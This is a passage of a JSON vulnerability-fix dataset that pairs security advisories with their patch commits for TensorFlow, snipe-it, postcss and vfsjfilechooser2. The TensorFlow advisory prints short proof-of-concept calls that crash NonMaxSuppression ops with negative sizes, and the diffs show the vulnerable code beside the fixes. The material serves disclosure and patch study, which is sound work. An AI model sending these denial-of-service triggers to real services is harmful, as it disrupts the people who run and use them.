            "score":5.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d'}",
            "dataset":"osv",
            "summary":"Crash in NMS ops caused by integer conversion to unsigned ### Impact\nAn attacker can cause denial of service in applications serving models using `tf.raw_ops.NonMaxSuppressionV5` by triggering a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],\n  scores=[1.0,2.0,3.0],\n  max_output_size=-1,\n  iou_threshold=0.5,\n  score_threshold=0.5,\n  soft_nms_sigma=1.0,\n  pad_to_max_output_size=True)\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc#L170-L271) uses a user controlled argument to resize a `std::vector`:\n\n```cc\n  const int output_size = max_output_size.scalar<int>()();\n  \/\/ ...\n  std::vector<int> selected;\n  \/\/ ...\n  if (pad_to_max_output_size) {\n    selected.resize(output_size, 0);\n    \/\/ ...\n  }\n```\n    \nHowever, as `std::vector::resize` takes the size argument as a `size_t` and `output_size` is an `int`, there is an implicit conversion to usigned. If the attacker supplies a negative value, this conversion results in a crash.\n\nA similar issue occurs in `CombinedNonMaxSuppression`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],\n  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],\n  max_output_size_per_class=-1,\n  max_total_size=10,\n  iou_threshold=score_threshold=0.5,\n  pad_per_class=True,\n  clip_boxes=True)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d) and commit [b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
            "published_date":"2021-08-25",
            "chain_len":2,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58",
            "commit_sha":"b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58",
            "patch":"MULTI",
            "chain_ord":"['b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58', '3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d']",
            "before_first_fix_commit":"{'a87fa31dc3becc97c7e945b9b8c8711acb92fc12'}",
            "last_fix_commit":"3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d",
            "chain_ord_pos":1.0,
            "commit_datetime":"07\/30\/2021, 05:24:52",
            "message":"Prevent overflow due to integer conversion to unsigned.\n\nPiperOrigin-RevId: 387738045\nChange-Id: Id7e95bc07e02df1c66b72bd09f389608c87bdebe",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 0, 'total': 2}",
            "files":"{'tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58\/tensorflow%2Fcore%2Fkernels%2Fimage%2Fnon_max_suppression_op.cc', 'patch': '@@ -930,6 +930,8 @@ class CombinedNonMaxSuppressionOp : public OpKernel {\\n         errors::InvalidArgument(\"max_size_per_class must be 0-D, got shape \",\\n                                 max_output_size.shape().DebugString()));\\n     const int max_size_per_class = max_output_size.scalar<int>()();\\n+    OP_REQUIRES(context, max_size_per_class > 0,\\n+                errors::InvalidArgument(\"max_size_per_class must be positive\"));\\n     \/\/ max_total_size: scalar\\n     const Tensor& max_total_size = context->input(3);\\n     OP_REQUIRES('}}",
            "message_norm":"prevent overflow due to integer conversion to unsigned.\n\npiperorigin-revid: 387738045\nchange-id: id7e95bc07e02df1c66b72bd09f389608c87bdebe",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('387738045', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc'])",
            "num_files":1.0,
            "patch_content":"From b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58 Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Thu, 29 Jul 2021 22:24:52 -0700\nSubject: [PATCH] Prevent overflow due to integer conversion to unsigned.\n\nPiperOrigin-RevId: 387738045\nChange-Id: Id7e95bc07e02df1c66b72bd09f389608c87bdebe\n---\n tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc | 2 ++\n 1 file changed, 2 insertions(+)\n\ndiff --git a\/tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc b\/tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc\nindex 5cb721ed7105fa..69b05cc9d84f83 100644\n--- a\/tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc\n+++ b\/tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc\n@@ -930,6 +930,8 @@ class CombinedNonMaxSuppressionOp : public OpKernel {\n         errors::InvalidArgument(\"max_size_per_class must be 0-D, got shape \",\n                                 max_output_size.shape().DebugString()));\n     const int max_size_per_class = max_output_size.scalar<int>()();\n+    OP_REQUIRES(context, max_size_per_class > 0,\n+                errors::InvalidArgument(\"max_size_per_class must be positive\"));\n     \/\/ max_total_size: scalar\n     const Tensor& max_total_size = context->input(3);\n     OP_REQUIRES(",
            "code_diff":"@@ -930,6 +930,8 @@ class CombinedNonMaxSuppressionOp : public OpKernel {\n         errors::InvalidArgument(\"max_size_per_class must be 0-D, got shape \",\n                                 max_output_size.shape().DebugString()));\n     const int max_size_per_class = max_output_size.scalar<int>()();\n+    OP_REQUIRES(context, max_size_per_class > 0,\n+                errors::InvalidArgument(\"max_size_per_class must be positive\"));\n     \/\/ max_total_size: scalar\n     const Tensor& max_total_size = context->input(3);\n     OP_REQUIRES("
        },
        {
            "index":304,
            "vuln_id":"GHSA-9vwf-54m9-gc4f",
            "cwe_id":"{'CWE-862', 'CWE-284'}",
            "score":4.3,
            "chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/1699c09758e56f740437674a8d6ba36443399f24'}",
            "dataset":"osv",
            "summary":"snipe-it is vulnerable to Improper Access Control snipe-it prior to version 5.3.4 is vulnerable to Improper Access Control. Regular users with `DENY` set to all models permissions can still view model information via the \/models\/{id}\/clone endpoint due to no authorize('view') permission being set.",
            "published_date":"2021-12-16",
            "chain_len":1,
            "project":"https:\/\/github.com\/snipe\/snipe-it",
            "commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/1699c09758e56f740437674a8d6ba36443399f24",
            "commit_sha":"1699c09758e56f740437674a8d6ba36443399f24",
            "patch":"SINGLE",
            "chain_ord":"['1699c09758e56f740437674a8d6ba36443399f24']",
            "before_first_fix_commit":"{'918e7c8dae4d41935f534901a582ea8488bbf603'}",
            "last_fix_commit":"1699c09758e56f740437674a8d6ba36443399f24",
            "chain_ord_pos":1.0,
            "commit_datetime":"12\/09\/2021, 13:42:18",
            "message":"Update AssetModelsController.php",
            "author":"Haxatron",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'app\/Http\/Controllers\/AssetModelsController.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/1699c09758e56f740437674a8d6ba36443399f24\/app%2FHttp%2FControllers%2FAssetModelsController.php', 'patch': \"@@ -269,7 +269,7 @@ public function show($modelId = null)\\n     *\/\\n     public function getClone($modelId = null)\\n     {\\n-        $this->authorize('view', AssetModel::class);\\n+        $this->authorize('create', AssetModel::class);\\n         \/\/ Check if the model exists\\n         if (is_null($model_to_clone = AssetModel::find($modelId))) {\\n             return redirect()->route('models.index')->with('error', trans('admin\/models\/message.does_not_exist'));\"}}",
            "message_norm":"update assetmodelscontroller.php",
            "language":"it",
            "entities":"[('update', 'ACTION', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['app\/Http\/Controllers\/AssetModelsController.php'])",
            "num_files":1.0,
            "patch_content":"From 1699c09758e56f740437674a8d6ba36443399f24 Mon Sep 17 00:00:00 2001\nFrom: Haxatron <76475453+Haxatron@users.noreply.github.com>\nDate: Thu, 9 Dec 2021 21:42:18 +0800\nSubject: [PATCH] Update AssetModelsController.php\n\n---\n app\/Http\/Controllers\/AssetModelsController.php | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/app\/Http\/Controllers\/AssetModelsController.php b\/app\/Http\/Controllers\/AssetModelsController.php\nindex 05fd8257d064..8d57346079b0 100755\n--- a\/app\/Http\/Controllers\/AssetModelsController.php\n+++ b\/app\/Http\/Controllers\/AssetModelsController.php\n@@ -269,7 +269,7 @@ public function show($modelId = null)\n     *\/\n     public function getClone($modelId = null)\n     {\n-        $this->authorize('view', AssetModel::class);\n+        $this->authorize('create', AssetModel::class);\n         \/\/ Check if the model exists\n         if (is_null($model_to_clone = AssetModel::find($modelId))) {\n             return redirect()->route('models.index')->with('error', trans('admin\/models\/message.does_not_exist'));",
            "code_diff":"@@ -269,7 +269,7 @@ public function show($modelId = null)\n     *\/\n     public function getClone($modelId = null)\n     {\n-        $this->authorize('view', AssetModel::class);\n+        $this->authorize('create', AssetModel::class);\n         \/\/ Check if the model exists\n         if (is_null($model_to_clone = AssetModel::find($modelId))) {\n             return redirect()->route('models.index')->with('error', trans('admin\/models\/message.does_not_exist'));"
        },
        {
            "index":537,
            "vuln_id":"GHSA-hwj9-h5mp-3pm3",
            "cwe_id":"{'CWE-400'}",
            "score":5.3,
            "chain":"{'https:\/\/github.com\/postcss\/postcss\/commit\/54cbf3c4847eb0fb1501b9d2337465439e849734', 'https:\/\/github.com\/postcss\/postcss\/commit\/b6f3e4d5a8d7504d553267f80384373af3a3dec5', 'https:\/\/github.com\/postcss\/postcss\/commit\/8682b1e4e328432ba692bed52326e84439cec9e4'}",
            "dataset":"osv",
            "summary":"Regular Expression Denial of Service in postcss The npm package `postcss` from 7.0.0 and before versions 7.0.36 and 8.2.10 is vulnerable to Regular Expression Denial of Service (ReDoS) during source map parsing.",
            "published_date":"2021-05-10",
            "chain_len":3,
            "project":"https:\/\/github.com\/postcss\/postcss",
            "commit_href":"https:\/\/github.com\/postcss\/postcss\/commit\/8682b1e4e328432ba692bed52326e84439cec9e4",
            "commit_sha":"8682b1e4e328432ba692bed52326e84439cec9e4",
            "patch":"MULTI",
            "chain_ord":"['8682b1e4e328432ba692bed52326e84439cec9e4', 'b6f3e4d5a8d7504d553267f80384373af3a3dec5', '54cbf3c4847eb0fb1501b9d2337465439e849734']",
            "before_first_fix_commit":"{'12832f3d203474bd273bd06bd3b2407567bfe09e'}",
            "last_fix_commit":"54cbf3c4847eb0fb1501b9d2337465439e849734",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/08\/2021, 06:57:25",
            "message":"Fix unsafe regexp",
            "author":"Andrey Sitnik",
            "comments":"{'com_1': {'author': 'aw3218', 'datetime': '04\/19\/2021, 18:32:44', 'body': 'Any chance of getting this change into a 7.0.36 version?'}, 'com_2': {'author': 'ai', 'datetime': '04\/19\/2021, 18:35:03', 'body': '7.x support is over on Jan 1, 2020.\\r\\n\\r\\nThe issue is not so critical (it affects only online tools like CodePen). It is better to use this reason to update to PostCSS 8.'}, 'com_3': {'author': 'aw3218', 'datetime': '04\/19\/2021, 18:43:33', 'body': \"Angular 11 is calling cssnano@4.1.10 which calls version 7.0.35. Updating to cssnano@5.0.1 won't compile angular 11.\\r\\n\\r\\n`-- @angular-devkit\/build-angular@0.1102.7\\r\\n  +-- css-loader@5.0.1\\r\\n  | `-- postcss@8.2.10\\r\\n  +-- **cssnano@4.1.10**\\r\\n  | +-- cssnano-preset-default@4.0.8\\r\\n  | | +-- css-declaration-sorter@4.0.1\\r\\n  | | | `-**- postcss@7.0.35**\"}, 'com_4': {'author': 'ai', 'datetime': '04\/19\/2021, 18:44:29', 'body': 'Ask Angular 11 to update cssnano.'}, 'com_5': {'author': 'GeorgiosP', 'datetime': '04\/21\/2021, 15:59:36', 'body': 'Would this effect any project using editors like [monaco-editor](https:\/\/github.com\/microsoft\/monaco-editor\/blob\/92d6800a00070f876faad9ee7997e9efea7c5e4b\/package-lock.json#L2825) which has postcss or other browser based code editors with a dependency on V7 of postcss \ud83d\udcad'}, 'com_6': {'author': 'ai', 'datetime': '04\/21\/2021, 16:10:07', 'body': '@GeorgiosP it affects only use cases when:\\r\\n\\r\\n1. User send you CSS\\r\\n2. You compile this CSS on your servers\\r\\n\\r\\nIn this case, the user can generate special CSS which will take seconds or minutes to compile. An attacker can use it to DoS your servers.\\r\\n\\r\\nIf you can\u2019t update PostCSS, you can add timeout for CSS processing.'}, 'com_7': {'author': 'GeorgiosP', 'datetime': '04\/21\/2021, 16:16:41', 'body': '@ai thanks for the additional context \ud83d\ude4f\ud83c\udffc'}, 'com_8': {'author': 'Sesughter01', 'datetime': '05\/17\/2021, 08:22:18', 'body': 'how do I upgrade from 8.1.14 to the patched 8.2.10 in my laravel project?'}, 'com_9': {'author': 'Kmap-Holdings', 'datetime': '05\/17\/2021, 11:18:13', 'body': 'Eagerly waiting for this answer'}, 'com_10': {'author': 'ai', 'datetime': '05\/17\/2021, 11:30:43', 'body': '@Sesughter01 `yarn upgrade` or `npm update` should update your nested dependencies. But it is better to ask in Laravel community.'}, 'com_11': {'author': 'josephzidell', 'datetime': '05\/21\/2021, 14:00:06', 'body': \"@ai We run a DevSecOps pipeline (gov't work), and these vulns are causing full blockages. Not every plugin is compatible with v8 at the moment. Seems like it's taking the community some time to make the jump. Would you consider cutting a 7.x release for this?\"}, 'com_12': {'author': 'ai', 'datetime': '05\/21\/2021, 14:11:11', 'body': '@josephzidell this vulnerability affects only runner (`postcss-loader`, `postcss-cli`, `gulp-postcss`) and only on web compilers accepting user-generated CSS (like CodePen).\\r\\n\\r\\nPostCSS in plugin dependencies doesn\u2019t affect by this vulnerability.\\r\\n\\r\\nPostCSS 7 support ended in January 2021.\\r\\n\\r\\nIf you want extended support, you can pay for PostCSS commercial support.'}, 'com_13': {'author': 'josaphatmayuba', 'datetime': '01\/13\/2022, 06:07:16', 'body': 'I have\\r\\n\\r\\n> npm update\\r\\n\\r\\n![image](https:\/\/user-images.githubusercontent.com\/97654468\/149274944-50df9859-8e4d-4d20-8532-e43bdfd949da.png)'}, 'com_14': {'author': 'hakkisabah', 'datetime': '01\/15\/2022, 08:45:37', 'body': \"> I have\\r\\n> \\r\\n> > npm update\\r\\n> \\r\\n> ![image](https:\/\/user-images.githubusercontent.com\/97654468\/149274944-50df9859-8e4d-4d20-8532-e43bdfd949da.png)\\r\\n\\r\\nI don't understand, i have same issue and even more...\\r\\n![Screenshot (11)](https:\/\/user-images.githubusercontent.com\/10910670\/149615701-8738f08d-e779-4fa6-9587-94c524e1d140.png)\"}}",
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'lib\/previous-map.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/postcss\/postcss\/raw\/8682b1e4e328432ba692bed52326e84439cec9e4\/lib%2Fprevious-map.js', 'patch': '@@ -54,7 +54,7 @@ class PreviousMap {\\n   }\\n \\n   loadAnnotation(css) {\\n-    let annotations = css.match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=.*\\\\s*\\\\*\\\\\/\/gm)\\n+    let annotations = css.match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=.*\\\\*\\\\\/\/gm)\\n \\n     if (annotations && annotations.length > 0) {\\n       \/\/ Locate the last sourceMappingURL to avoid picking up'}}",
            "message_norm":"fix unsafe regexp",
            "language":"ca",
            "entities":"[('fix', 'ACTION', ''), ('unsafe', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/previous-map.js'])",
            "num_files":1.0,
            "patch_content":"From 8682b1e4e328432ba692bed52326e84439cec9e4 Mon Sep 17 00:00:00 2001\nFrom: Andrey Sitnik <andrey@sitnik.ru>\nDate: Thu, 8 Apr 2021 02:57:25 -0400\nSubject: [PATCH] Fix unsafe regexp\n\n---\n lib\/previous-map.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/lib\/previous-map.js b\/lib\/previous-map.js\nindex 1a5bd1cf3..ff474a2bf 100644\n--- a\/lib\/previous-map.js\n+++ b\/lib\/previous-map.js\n@@ -54,7 +54,7 @@ class PreviousMap {\n   }\n \n   loadAnnotation(css) {\n-    let annotations = css.match(\/\\\/\\*\\s*# sourceMappingURL=.*\\s*\\*\\\/\/gm)\n+    let annotations = css.match(\/\\\/\\*\\s*# sourceMappingURL=.*\\*\\\/\/gm)\n \n     if (annotations && annotations.length > 0) {\n       \/\/ Locate the last sourceMappingURL to avoid picking up",
            "code_diff":"@@ -54,7 +54,7 @@ class PreviousMap {\n   }\n \n   loadAnnotation(css) {\n-    let annotations = css.match(\/\\\/\\*\\s*# sourceMappingURL=.*\\s*\\*\\\/\/gm)\n+    let annotations = css.match(\/\\\/\\*\\s*# sourceMappingURL=.*\\*\\\/\/gm)\n \n     if (annotations && annotations.length > 0) {\n       \/\/ Locate the last sourceMappingURL to avoid picking up"
        },
        {
            "index":882,
            "vuln_id":"GHSA-c7fh-chf7-jr5x",
            "cwe_id":"{'CWE-770'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/fracpete\/vfsjfilechooser2\/commit\/9c9f2c317f3de5ece60a3ae28c371e9796e3909b'}",
            "dataset":"osv",
            "summary":"ReDOS in Vfsjfilechooser2 A Regular Expression Denial of Service (ReDOS) vulnerability was discovered in Vfsjfilechooser2 which occurs when the application attempts to validate crafted URIs.",
            "published_date":"2022-01-06",
            "chain_len":1,
            "project":"https:\/\/github.com\/fracpete\/vfsjfilechooser2",
            "commit_href":"https:\/\/github.com\/fracpete\/vfsjfilechooser2\/commit\/9c9f2c317f3de5ece60a3ae28c371e9796e3909b",
            "commit_sha":"9c9f2c317f3de5ece60a3ae28c371e9796e3909b",
            "patch":"SINGLE",
            "chain_ord":"['9c9f2c317f3de5ece60a3ae28c371e9796e3909b']",
            "before_first_fix_commit":"{'5a5f3487dd44066beb2351a332751932df39973b'}",
            "last_fix_commit":"9c9f2c317f3de5ece60a3ae28c371e9796e3909b",
            "chain_ord_pos":1.0,
            "commit_datetime":"10\/06\/2020, 21:18:37",
            "message":"incorporated Yeting Li's fix for Potential Regex Denial of Service (ReDoS), see https:\/\/github.com\/fracpete\/vfsjfilechooser2\/issues\/7\npasswords can now also contain special characters (eg :), which have to be URL encoded (ie %3A)",
            "author":"Peter Reutemann",
            "comments":null,
            "stats":"{'additions': 95, 'deletions': 73, 'total': 168}",
            "files":"{'src\/main\/java\/com\/googlecode\/vfsjfilechooser2\/utils\/VFSURIValidator.java': {'additions': 95, 'deletions': 73, 'changes': 168, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/fracpete\/vfsjfilechooser2\/raw\/9c9f2c317f3de5ece60a3ae28c371e9796e3909b\/src%2Fmain%2Fjava%2Fcom%2Fgooglecode%2Fvfsjfilechooser2%2Futils%2FVFSURIValidator.java', 'patch': '@@ -2,6 +2,8 @@\\n  * VFS URIs validator\\n  *\\n  * Copyright (C) 2008 Stan Love\\n+ * Copyright (C) 2020 University of Waikato, Hamilton, NZ\\n+ * Copyright (C) 2020 Yeting Li\\n  *\\n  * Licensed under the Apache License, Version 2.0 (the \"License\");\\n  * you may not use this file except in compliance with the License.\\n@@ -233,11 +235,11 @@ else if ((drive != null) && (file == null)) {\\n \\t\\t\/\/        \"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.*?:.*?@)*([^:]+)([ \\t]*:[0-9]+)*([ \\t]*:)*(\/.*)\");\\n \\t\\t\/\/\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+)([ \\t]*:[0-9]+)*([ \\t]*:)*(\/.*)\");\\n \\t\\tPattern p_ftp2 = Pattern\\n-\\t\\t\\t\\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+?\/*)([ \\t]*:[0-9]+)*([ \\t]*:)*(\/.*)\");\\n+\\t\\t\\t\\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/([^:@]+:[^:@]+@)*([^:]+?\/*)([ ]*:[0-9]+)*([ ]*:)*(\/.*)\");\\n \\t\\tMatcher m_ftp2 = p_ftp2.matcher(_uri);\\n \\n \\t\\tPattern p_ftp3 = Pattern\\n-\\t\\t\\t\\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+)([ \\t]*:[0-9]+)*([ \\t]*:)*(\/*?.*)\");\\n+\\t\\t\\t\\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/([^:@]+:[^:@]+@)*([^:]+)([ \\t]*:[0-9]+)*([ \\t]*:)*(\/*?.*)\");\\n \\t\\tMatcher m_ftp3 = p_ftp3.matcher(_uri);\\n \\n \\t\\tif (m_ftp2.matches()) {\\n@@ -344,6 +346,26 @@ else if ((drive != null) && (file == null)) {\\n \\t\\t\\tif (local_pass.startsWith(\":\")) {\\n \\t\\t\\t\\tlocal_pass = local_pass.substring(1);\\n \\t\\t\\t}\\n+\\t\\t\\t\/\/ decode specials chars (URL encoded %XY)\\n+\\t\\t\\tif (local_pass.contains(\"%\")) {\\n+\\t\\t\\t\\tString tmp_local_pass = local_pass;\\n+\\t\\t\\t\\tStringBuilder new_local_pass = new StringBuilder();\\n+\\t\\t\\t\\twhile (tmp_local_pass.contains(\"%\")) {\\n+\\t\\t\\t\\t\\tnew_local_pass.append(tmp_local_pass.substring(0, tmp_local_pass.indexOf(\\'%\\')));\\n+\\t\\t\\t\\t\\ttmp_local_pass = tmp_local_pass.substring(tmp_local_pass.indexOf(\\'%\\'));\\n+\\t\\t\\t\\t\\tif (tmp_local_pass.length() >= 3) {\\n+\\t\\t\\t\\t\\t\\tchar c = (char) Integer.parseInt(tmp_local_pass.substring(1, 3), 16);\\n+\\t\\t\\t\\t\\t\\tnew_local_pass.append(c);\\n+\\t\\t\\t\\t\\t\\ttmp_local_pass = tmp_local_pass.substring(3);\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\telse {\\n+\\t\\t\\t\\t\\t\\tbreak;\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t}\\n+\\t\\t\\t\\tif (!tmp_local_pass.isEmpty())\\n+\\t\\t\\t\\t\\tnew_local_pass.append(tmp_local_pass);\\n+\\t\\t\\t\\tlocal_pass = new_local_pass.toString();\\n+\\t\\t\\t}\\n \\t\\t}\\n \\t\\tlocal_hostname = hostname;\\n \\t\\tlocal_port = port;\\n@@ -823,26 +845,26 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"ftp:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"ftp:\/\/user:pass%3Aa@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n \\t\\t}\\n \\t\\tv.assertEquals(v.getProtocol(), \"ftp\");\\n \\t\\tv.assertEquals(v.getUser(), \"user\");\\n-\\t\\tv.assertEquals(v.getPassword(), \"pass:\");\\n+\\t\\tv.assertEquals(v.getPassword(), \"pass:a\");\\n \\t\\tv.assertEquals(v.getHostname(), \"machine\");\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"ftp:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"ftp:\/\/user:pass%3A%3a@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n \\t\\t}\\n \\t\\tv.assertEquals(v.getProtocol(), \"ftp\");\\n \\t\\tv.assertEquals(v.getUser(), \"user\");\\n-\\t\\tv.assertEquals(v.getPassword(), \"pass:\");\\n+\\t\\tv.assertEquals(v.getPassword(), \"pass::\");\\n \\t\\tv.assertEquals(v.getHostname(), \"machine\");\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n@@ -992,7 +1014,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"FTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"FTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1004,7 +1026,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"FTP:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"FTP:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1161,7 +1183,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"sftp:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"sftp:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1173,7 +1195,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"sftp:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"sftp:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1185,7 +1207,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"sftp: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"sftp: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1197,7 +1219,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"sftp:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"sftp:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1209,7 +1231,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"sftp:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"sftp:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1221,7 +1243,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"sftp:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"sftp:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1233,7 +1255,7 